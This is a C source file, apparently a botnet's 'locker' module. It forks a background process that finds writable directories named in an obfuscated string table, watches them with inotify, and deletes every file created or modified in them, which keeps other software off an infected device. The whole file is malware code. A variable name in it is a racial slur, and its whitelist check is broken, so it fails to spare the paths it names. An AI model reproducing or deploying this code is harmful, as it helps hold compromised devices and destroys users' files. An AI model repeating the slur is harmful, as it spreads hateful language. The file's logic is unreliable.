#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <string.h>

#include "../headers/includes.h"
#include "../headers/table.h"

#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))

struct watcher
{
    char *path;
    int wd;
};

struct watcher **watchers = NULL;
char **paths = NULL, buffer[EVENT_BUF_LEN];
int num_paths = 0, num_watchers = 0, niggerlen, fd, Locker_Pid;

void find_writable_dirs(const char *dir)
{
    DIR *dp = opendir(dir);
    if (!dp)
        return;

    if (access(dir, W_OK) == 0)
    {
        paths = realloc(paths, (num_paths + 1) * sizeof(char *));
        paths[num_paths] = strdup(dir);
        num_paths++;
    }

    struct dirent *entry;
    while ((entry = readdir(dp)))
    {
        if (entry->d_name[0] != '.' && entry->d_type == 4)
        {
            char p[1024];
            snprintf(p, sizeof(p), "%s/%s", dir, entry->d_name);
            find_writable_dirs(p);
        }
    }

    closedir(dp);
}

int locker_destroy(void)
{
#ifdef LOCKER_DEBUG
    printf("[locker] destroying\n");
#endif

    int i = 0;

    for (i = 0; i < num_paths; i++)
    {
        inotify_rm_watch(fd, watchers[i]->wd);
        free(watchers[i]->path);
    }
    close(fd);

    return 0;
}

void locker_init()
{
    Locker_Pid = fork();
    if (Locker_Pid > 0 || Locker_Pid == -1)
        return;

    prctl(PR_SET_PDEATHSIG, SIGHUP);

#ifdef LOCKER_DEBUG
    printf("[locker] started\n");
#endif

    int i, h;

    for (i = 15; i < 21; i++)
    {
        sec_toggle(i);
        find_writable_dirs(sec_unwrap(i, NULL));
        sec_toggle(i);
    }

    fd = inotify_init();
    if (fd < 0)
        return;

    for (i = 0; i < num_paths; ++i)
    {
        watchers = realloc(watchers, (num_watchers + 1) * sizeof(struct watcher *));
        if (watchers == NULL)
            return;

        struct watcher *watch = malloc(sizeof(struct watcher));

        watch->path = strdup(paths[i]);
        if (watch->path == NULL)
            return;

        watch->wd = inotify_add_watch(fd, watch->path, IN_CREATE | IN_MODIFY);
        if (watch->wd == -1)
            return;

#ifdef LOCKER_DEBUG
        printf("[locker] added [%s] to watch list\n", watch->path);
#endif

        watchers[num_watchers] = watch;
        num_watchers++;
    }

#ifdef LOCKER_DEBUG
    printf("[locker] watching [%d] directories using inotify\n", num_paths);
#endif

    while (1)
    {
        niggerlen = read(fd, buffer, EVENT_BUF_LEN);
        if (niggerlen < 0)
            return;

        i = 0;

        while (i < niggerlen)
        {
            struct inotify_event *event = (struct inotify_event *)&buffer[i];

            for (int j = 0; j < num_paths; j++)
            {
                if (event->wd != watchers[j]->wd)
                    continue;
                if (event->mask & IN_ISDIR)
                    continue;

                char name[FILENAME_MAX] = "";
                strcpy(name, watchers[j]->path);
                strcat(name, "/");
                strcat(name, event->name);

                for (h = 21; h < 24; ++h)
                {
                    sec_toggle(h);
                    if (strcmp(name, sec_unwrap(h, NULL)) == 0)
                        continue;

                    sec_toggle(h);
                }

                if (remove(name) == -1)
                    break;

#ifdef LOCKER_DEBUG
                printf("[locker] deleted file [%s]\n", name);
#endif

                break;
            }

            i += EVENT_SIZE + event->len;
        }
    }
}
